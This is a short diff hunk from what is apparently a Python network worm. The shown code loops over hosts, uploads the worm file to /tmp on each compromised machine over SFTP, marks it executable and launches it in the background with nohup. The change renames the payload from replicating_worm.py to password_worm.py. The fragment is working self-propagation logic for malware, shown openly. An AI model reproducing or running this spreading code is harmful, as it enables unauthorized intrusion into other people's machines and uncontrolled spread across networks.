@@ -155,9 +155,9 @@ for Host in network:
 			print("Spreading to this machine: %s" %(str(Host)))
 			try:
 				sftpClient = sshInfo[0].open_sftp()
-				sftpClient.put("replicating_worm.py", "/tmp/" + "replicating_worm.py")
-				sshInfo[0].exec_command("chmod a+x /tmp/replicating_worm.py")
-				sshInfo[0].exec_command("nohup python /tmp/replicating_worm.py &")
+				sftpClient.put("password_worm.py", "/tmp/" + "password_worm.py")
+				sshInfo[0].exec_command("chmod a+x /tmp/password_worm.py")
+				sshInfo[0].exec_command("nohup python /tmp/password_worm.py &")
 			except:
 				print ("Something went wrong")
 
